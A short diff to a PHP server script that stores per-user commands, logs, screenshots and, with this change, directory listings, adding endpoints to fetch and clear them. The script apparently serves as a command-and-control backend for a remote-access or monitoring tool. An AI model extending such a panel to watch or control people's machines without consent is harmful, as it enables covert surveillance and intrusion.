@@ -71,6 +71,7 @@ else if ($req === 'del_data') {
 	unlink($dir_cmds.$user);
 	unlink($dir_info.$user);
 	unlink($dir_log.$user);
+	unlink($dir_ls.$user);
 }
 else if ($req === 'put_cmd') {
 	$user = pv('user');
@@ -122,6 +123,18 @@ else if ($req === 'clear_log') {
 	check_user($dir_log, $user);
 	
 	file_put_contents($dir_log.$user, '');
+}
+else if ($req === 'get_ls') {
+	$user = pv('user');
+	check_user($dir_ls, $user);
+	
+	echo file_get_contents($dir_ls.$user);
+}
+else if ($req === 'clear_ls') {
+	$user = pv('user');
+	check_user($dir_ls, $user);
+	
+	file_put_contents($dir_ls.$user, '');
 }
 else if ($req === 'list_screenshots') {
 	$screenshots = get_files($dir_screenshots);
